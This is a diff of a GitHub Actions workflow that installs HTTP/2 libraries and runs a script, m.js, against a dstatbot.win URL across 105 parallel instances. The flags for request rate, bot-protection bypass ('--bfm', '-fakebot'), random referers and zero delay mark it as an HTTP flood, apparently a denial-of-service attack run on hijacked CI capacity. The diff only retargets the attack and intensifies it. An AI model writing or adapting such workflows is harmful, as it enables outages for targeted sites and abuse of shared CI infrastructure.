@@ -30,7 +30,7 @@ jobs:
         run: npm install hpack.js chalk hpack
       
       - name: Run m.js
-        run: node m.js GET https://c4.dstatbot.win/GjnX2w1M 300 24 100 --bfm true --cache --referer rand --randrate --connect --delay 200 --http 2
+        run: node m.js GET https://c3.dstatbot.win/YKA2OsbR 300 24 100 --bfm true -fakebot --referer rand --randrate --connect --delay -1 --http 2
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 105
